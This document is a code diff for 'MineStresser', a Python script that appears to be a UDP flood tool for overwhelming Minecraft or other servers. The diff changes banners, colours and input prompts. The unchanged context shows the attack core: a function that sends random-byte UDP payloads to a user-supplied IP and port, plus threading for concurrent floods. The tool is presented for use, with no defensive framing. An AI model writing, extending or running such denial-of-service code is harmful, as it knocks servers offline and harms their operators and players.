@@ -1,8 +1,10 @@
+print ("\033[92m")
 import socket
 import time
 import os
 import random
 import threading
+import sys
 
 # Coding MineStresser
 # Attack
@@ -13,24 +15,17 @@ def attack(ip, port):
     payload = os.urandom(len)
     s.sendto(payload, (ip, port))
 # VPS
-
-art = r"""
-
-
-═══ M I N E S T R E S S E R ═══
-
-"""
-os.system("clear")
-print("\033[31m" + art)
+os.system("figlet MineStresser")
+print("\033[92m")
 print("Credit: @MineGamerST")
 print(" ")
 time.sleep(1)
-ip = input("Enter The Server IP: ")
-port = int(input("Enter The Server Port: "))
+ip = input("IP: ")
+port = int(input("Port: "))
 time.sleep(1)
 print(" ")
 os.system("clear")
-print(art)
+os.system("figlet MineStresser")
 print(" ")
 print(f"Running {ip} {port}")
 # Start Attack
